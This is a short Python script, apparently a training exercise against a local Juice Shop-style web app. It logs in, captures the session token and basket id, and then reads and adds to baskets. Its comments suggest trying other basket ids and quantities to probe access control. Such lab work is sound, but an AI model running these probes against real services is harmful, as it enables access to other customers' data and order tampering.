import requests
import sys
import json

user_name = sys.argv[1]
password = sys.argv[2]

url = "http://localhost:3000"
endpoint_login = "/rest/user/login"
endpoint_whoami = "/rest/user/whoami"
values = {
    "email": user_name,
    "password": password
}

login_res = requests.post(url+endpoint_login, data=values)

# check if the response was 200
if login_res.status_code != 200:
    print("Login failed. Please ensure that the user is created, and check the email and password. Usage: python attack.py <email> <password>")
else:
    #login successful
    print(login_res.text)
    login_res_dict = json.loads(login_res.text)

    token = login_res_dict['authentication']['token']
    bid = str(login_res_dict['authentication']['bid']) ## this is the basket id used to make requests to basketApi
    print(token + '\n')

    # send get request to whoami
    headerWithToken = {
        "Authorization": "Bearer " + token,
        "Cookie": "token="+token}
    whoami_res = requests.get(url+endpoint_whoami, headers=headerWithToken)

    if whoami_res.status_code != 200:
        print("Something went wrong while sending GET requests to whoami \n")
    else:
        print(whoami_res.text + '\n')

        # This checks if the basket given bid is successfully created, also returns products in the basket
        endpoint_basket = "/rest/basket/" + bid  # can try other random bid's
        b_res = requests.get(url+endpoint_basket, headers=headerWithToken)

        # add item to basket
        endpoint_basketItems = "/api/BasketItems/"
        item_payload = {
            'ProductId': 1,
            'BasketId': bid,
            'quantity': 1  # can try different quantities here
        }

        basket_res = requests.post(url+endpoint_basketItems, json=item_payload, headers=headerWithToken)

        print(basket_res.text +'\n')

    
    